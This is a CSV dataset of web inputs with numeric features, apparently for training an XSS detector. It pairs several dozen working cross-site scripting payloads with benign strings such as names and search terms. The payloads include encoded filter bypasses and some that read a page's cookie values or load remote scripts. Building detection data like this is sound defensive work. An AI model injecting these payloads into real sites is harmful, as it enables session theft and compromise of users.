payload,payload_length,payload_type,response_code,response_length,triggered,has_single_quote,has_angle_bracket,has_double_dash,has_equals,special_char_count,payload_type_encoded
"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",4.163323003513207,xss,-0.4397387471509151,0.7708376785852603,1,0,1,0,1,3.305191939854564,1
"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",7.164513207296462,xss,-0.4397387471509151,0.9671929860250719,1,0,1,0,1,1.823181541788062,1
"<a target=""x"" href=""xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",2.8852136107348487,xss,-0.4397387471509151,0.6872163331455929,1,1,1,0,1,2.378935441063,1
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",2.4497096694918525,xss,-0.4397387471509151,0.6587231339587433,1,1,1,0,1,2.564186740821313,1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",0.14911276249080843,xss,-0.4397387471509151,0.5082047121673421,1,0,1,0,1,0.2670706238182343,1
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,-0.06863920813068959,xss,-0.4397387471509151,0.49395811257391725,1,1,1,0,1,-0.029331455795066172,1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",0.37633221009584983,xss,-0.4397387471509151,0.523070729134394,1,0,1,0,1,0.3041208837698969,1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",-0.030769300196516025,xss,-0.4397387471509151,0.4964357820684259,1,0,1,0,1,0.04476906410825895,1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",0.3952671640629366,xss,-0.4397387471509151,0.5243095638816484,1,0,1,0,1,0.378221403673222,1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?",0.40473464104648,xss,-0.4397387471509151,0.5249289812552755,1,0,1,0,1,0.378221403673222,1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",-0.04970425416360281,xss,-0.4397387471509151,0.4951969473211716,1,0,1,0,1,-0.06638171574672873,1
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,0.23432005534269895,xss,-0.4397387471509151,0.5137794685299866,1,0,1,0,1,0.04476906410825895,1
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",-0.07810668511423298,xss,-0.4397387471509151,0.49333869520029006,1,1,1,0,1,0.19297010391490918,1
<%<!--'%><script>alert(1);</script -->,-0.15384650098258013,xss,-0.4397387471509151,0.48838335621127277,1,1,1,1,0,0.23002036386657174,1
"<script src=""data:text/javascript,alert(1)""></script>",-0.01183434622942924,xss,-0.4397387471509151,0.49767461681568026,1,0,1,0,1,0.007718804156596389,1
<iframe/src \/\/onload = prompt(1),-0.19171640891675368,xss,-0.4397387471509151,0.4859056867167641,1,0,1,0,1,-0.14048223565005385,1
<iframe/onreadystatechange=alert(1),-0.1822489319332103,xss,-0.4397387471509151,0.48652510409039124,1,0,1,0,1,-0.2886832754567041,1
<svg/onload=alert(1),-0.32426108668636117,xss,-0.4397387471509151,0.47723384348598374,1,0,1,0,1,-0.2886832754567041,1
<input value=<><iframe/src=javascript:confirm(1),-0.0591717311471462,xss,-0.4397387471509151,0.4945775299475444,1,0,1,0,1,-0.1034319756983913,1
"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",0.07337294662246129,xss,-0.4397387471509151,0.5032493731783247,1,1,1,0,1,0.19297010391490918,1
http://www.<script>alert(1)</script .com,-0.13491154701549335,xss,-0.4397387471509151,0.4896221909585271,1,0,1,0,0,-0.06638171574672873,1
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?,8.688777001646947,xss,-0.4397387471509151,1.0669191831790454,1,0,1,0,1,12.53070666781854,1
<svg><script ?>alert(1),-0.295858655735731,xss,-0.4397387471509151,0.4790920956068653,1,0,1,0,0,-0.21458275555337897,1
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,0.7266288584869554,xss,-0.4397387471509151,0.5459891719585992,1,0,1,0,1,1.1192266027064732,1
<img src=`xx:xx`onerror=alert(1)>,-0.2011838859002971,xss,-0.4397387471509151,0.4852862693431369,1,0,1,0,1,-0.14048223565005385,1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",0.2059176243920688,xss,-0.4397387471509151,0.511921216409105,1,0,1,0,1,0.23002036386657174,1
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",0.12071033154017825,xss,-0.4397387471509151,0.5063464600464606,1,0,1,0,1,0.11886958401158407,1
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",-0.04970425416360281,xss,-0.4397387471509151,0.4951969473211716,1,0,1,0,1,0.007718804156596389,1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>?",0.2721899632768725,xss,-0.4397387471509151,0.5162571380244952,1,0,1,0,1,0.11886958401158407,1
<svg contentScriptType=text/vbs><script>MsgBox+1,-0.0591717311471462,xss,-0.4397387471509151,0.4945775299475444,1,0,1,0,1,-0.21458275555337897,1
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",0.1964501474085254,xss,-0.4397387471509151,0.5113017990354779,1,0,1,0,1,0.4523219235765471,1
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,0.22485257835915556,xss,-0.4397387471509151,0.5131600511563594,1,1,1,0,1,0.04476906410825895,1
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,0.7455638124540421,xss,-0.4397387471509151,0.5472280067058535,1,1,1,0,0,0.7116737432381851,1
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",0.4236695950135668,xss,-0.4397387471509151,0.5261678160025298,1,1,1,0,1,0.48937218352820966,1
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",0.6130191346844347,xss,-0.4397387471509151,0.5385561634750732,1,0,1,0,1,1.1933271226097983,1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,0.0071006077376575445,xss,-0.4397387471509151,0.4989134515629346,1,0,1,0,1,0.04476906410825895,1
<script>+-+-1-+-+alert(1)</script>,-0.19171640891675368,xss,-0.4397387471509151,0.4859056867167641,1,0,1,0,0,0.08181932405992151,1
<body/onload=&lt;!--&gt;&#10alert(1)>,-0.1633139779661235,xss,-0.4397387471509151,0.48776393883764557,1,0,1,1,1,0.08181932405992151,1
<script itworksinallbrowsers>/*<script* */alert(1)</script ?,0.0544379926553745,xss,-0.4397387471509151,0.5020105384310704,1,0,1,0,0,0.007718804156596389,1
<img src ?itworksonchrome?\/onerror = alert(1)???,-0.04970425416360281,xss,-0.4397387471509151,0.4951969473211716,1,0,1,0,1,-0.06638171574672873,1
<svg><script>//&NewLine;confirm(1);</script </svg>,-0.04023677718005942,xss,-0.4397387471509151,0.49581636469479873,1,0,1,0,0,0.11886958401158407,1
<svg><script onlypossibleinopera:-)> alert(1),-0.08757416209777638,xss,-0.4397387471509151,0.4927192778266629,1,0,1,0,0,-0.14048223565005385,1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,0.5656817497667177,xss,-0.4397387471509151,0.5354590766069374,1,0,1,0,1,0.04476906410825895,1
<script x> alert(1) </script 1=2,-0.21065136288384048,xss,-0.4397387471509151,0.48466685196950976,1,0,1,0,1,-0.21458275555337897,1
"<div/onmouseover='alert(1)'> style=""x:"">",-0.13491154701549335,xss,-0.4397387471509151,0.4896221909585271,1,1,1,0,1,0.007718804156596389,1
<--`<img/src=` onerror=alert(1)> --!>,-0.1633139779661235,xss,-0.4397387471509151,0.48776393883764557,1,0,1,1,1,0.11886958401158407,1
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",0.9159783981578232,xss,-0.4397387471509151,0.5583775194311424,1,0,1,0,1,1.6008799820780866,1
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",0.6508890426186082,xss,-0.4397387471509151,0.5410338329695819,1,0,1,0,1,0.63757322333486,1
"""><img src=x onerror=window.open('https://www.google.com/');>",0.0639054696389179,xss,-0.4397387471509151,0.5026299558046976,1,1,1,0,1,0.19297010391490918,1
<form><button formaction=javascript&colon;alert(1)>CLICKME,0.03550303868828772,xss,-0.4397387471509151,0.5007717036838161,1,0,1,0,1,-0.14048223565005385,1
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?",0.18698267042498198,xss,-0.4397387471509151,0.5106823816618508,1,0,1,0,1,-0.029331455795066172,1
"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",0.575149226750261,xss,-0.4397387471509151,0.5360784939805645,1,0,1,0,1,0.8598747830448353,1
"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",2.364502376639962,xss,-0.4397387471509151,0.6531483775960988,1,0,1,0,1,4.046197138887815,1
"""><img src=x onerror=prompt(1);>",-0.21065136288384048,xss,-0.4397387471509151,0.48466685196950976,1,0,1,0,1,-0.14048223565005385,1
john,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
jane,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
bob,-0.4852081954065989,xss,-0.4397387471509151,0.46670374813432197,0,0,0,0,0,-0.4739345752150169,1
alice,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
admin,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
hello,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
world,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
test,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
search,-0.45680576445596865,xss,-0.4397387471509151,0.46856200025520345,0,0,0,0,0,-0.4739345752150169,1
query,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
1,-0.5041431493736857,xss,-0.4397387471509151,0.46546491338706764,0,0,0,0,0,-0.4739345752150169,1
2,-0.5041431493736857,xss,-0.4397387471509151,0.46546491338706764,0,0,0,0,0,-0.4739345752150169,1
3,-0.5041431493736857,xss,-0.4397387471509151,0.46546491338706764,0,0,0,0,0,-0.4739345752150169,1
42,-0.49467567239014226,xss,-0.4397387471509151,0.4660843307606948,0,0,0,0,0,-0.4739345752150169,1
100,-0.4852081954065989,xss,-0.4397387471509151,0.46670374813432197,0,0,0,0,0,-0.4739345752150169,1
user@email.com,-0.38106594858762155,xss,-0.4397387471509151,0.4735173392442208,0,0,0,0,0,-0.39983405531169175,1
test@test.com,-0.39053342557116494,xss,-0.4397387471509151,0.4728979218705936,0,0,0,0,0,-0.39983405531169175,1
laptop,-0.45680576445596865,xss,-0.4397387471509151,0.46856200025520345,0,0,0,0,0,-0.4739345752150169,1
phone,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
shoes,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
book,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
music,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
password,-0.4378708104888819,xss,-0.4397387471509151,0.4698008350024578,0,0,0,0,0,-0.4739345752150169,1
username,-0.4378708104888819,xss,-0.4397387471509151,0.4698008350024578,0,0,0,0,0,-0.4739345752150169,1
login,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
home,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
help,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
2024,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
01/01/2023,-0.4189358565217951,xss,-0.4397387471509151,0.4710396697497121,0,0,0,0,0,-0.39983405531169175,1
january,-0.44733828747242527,xss,-0.4397387471509151,0.46918141762883064,0,0,0,0,0,-0.4739345752150169,1
www.google.com,-0.38106594858762155,xss,-0.4397387471509151,0.4735173392442208,0,0,0,0,0,-0.39983405531169175,1
http://example.com,-0.34319604065344794,xss,-0.4397387471509151,0.47599500873872946,0,0,0,0,0,-0.32573353540836664,1
hello world,-0.4094683795382517,xss,-0.4397387471509151,0.47165908712333926,0,0,0,0,0,-0.4739345752150169,1
foo,-0.4852081954065989,xss,-0.4397387471509151,0.46670374813432197,0,0,0,0,0,-0.4739345752150169,1
bar,-0.4852081954065989,xss,-0.4397387471509151,0.46670374813432197,0,0,0,0,0,-0.4739345752150169,1
input,-0.46627324143951204,xss,-0.4397387471509151,0.4679425828815763,0,0,0,0,0,-0.4739345752150169,1
data,-0.47574071842305543,xss,-0.4397387471509151,0.4673231655079491,0,0,0,0,0,-0.4739345752150169,1
